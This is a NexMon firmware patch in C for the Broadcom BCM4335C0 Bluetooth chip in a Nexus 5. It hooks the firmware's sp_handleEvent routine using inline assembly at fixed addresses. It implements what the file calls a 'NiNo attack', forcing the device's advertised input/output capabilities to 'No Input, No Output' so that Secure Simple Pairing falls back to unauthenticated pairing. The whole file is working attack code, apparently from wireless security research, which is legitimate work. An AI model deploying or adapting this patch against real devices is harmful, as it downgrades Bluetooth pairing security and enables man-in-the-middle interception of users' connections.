/***************************************************************************
 *                                                                         *
 *          ###########   ###########   ##########    ##########           *
 *         ############  ############  ############  ############          *
 *         ##            ##            ##   ##   ##  ##        ##          *
 *         ##            ##            ##   ##   ##  ##        ##          *
 *         ###########   ####  ######  ##   ##   ##  ##    ######          *
 *          ###########  ####  #       ##   ##   ##  ##    #    #          *
 *                   ##  ##    ######  ##   ##   ##  ##    #    #          *
 *                   ##  ##    #       ##   ##   ##  ##    #    #          *
 *         ############  ##### ######  ##   ##   ##  ##### ######          *
 *         ###########    ###########  ##   ##   ##   ##########           *
 *                                                                         *
 *            S E C U R E   M O B I L E   N E T W O R K I N G              *
 *                                                                         *
 * This file is part of NexMon.                                            *
 *                                                                         *
 * Copyright (c) 2016 NexMon Team                                          *
 *                                                                         *
 * NexMon is free software: you can redistribute it and/or modify          *
 * it under the terms of the GNU General Public License as published by    *
 * the Free Software Foundation, either version 3 of the License, or       *
 * (at your option) any later version.                                     *
 *                                                                         *
 * NexMon is distributed in the hope that it will be useful,               *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 * GNU General Public License for more details.                            *
 *                                                                         *
 * You should have received a copy of the GNU General Public License       *
 * along with NexMon. If not, see <http://www.gnu.org/licenses/>.          *
 *                                                                         *
 **************************************************************************/

#pragma NEXMON targetregion "patch"
#include <firmware_version.h>
#include <patcher.h>


//__attribute__((at(0xd7800, "", CHIP_VER_BCM4335C0_BT)))
void nino(void) {
	// preamble:
	// restore first 4 bytes of sp_handleEvent
	__asm__(	"push {r4-r6, lr}\n\t"
			"mov r4, r0\n\t"); 

	// NiNo attack in state machine
	char* io_caps = (char*) 0x20387D;	// io_caps variable
	*io_caps = 0x03;			// No Input, No Output

	// postamble:
	// branch back into sp_handleEvent+4
	__asm__("b 0x303D8");
}


// write hook to nino into the first 4 bytes of sp_handleEvent
__attribute__((at(0x303D4, "", CHIP_VER_BCM4335C0_BT, FW_VER_NEXUS5)))
BPatch(nino1, nino);
